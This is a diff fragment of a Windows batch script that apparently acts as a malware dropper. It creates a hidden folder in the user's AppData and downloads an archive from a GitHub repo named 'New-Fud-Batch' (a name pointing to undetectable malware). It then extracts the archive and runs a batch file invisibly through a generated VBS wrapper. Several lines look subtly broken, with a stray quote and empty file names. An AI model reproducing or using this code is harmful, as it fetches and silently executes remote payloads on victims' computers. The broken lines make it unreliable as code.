@@ -22,10 +22,10 @@ if '%errorlevel%' NEQ '0' (
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
-cd "C:\Users\%USERNAME%\AppData\Local\Anon"
-wget https://github.com/AnonAm93/New-Fud-Batch//main/.bat
-tar -xf 1.zip
-del 1.zip
+cd C:\Users\%USERNAME%\AppData\Local\Anon" 
+wget https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip
+tar -xf .zip
+del .zip
 echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs
 wscript.exe "C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs" "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat.bat"
 
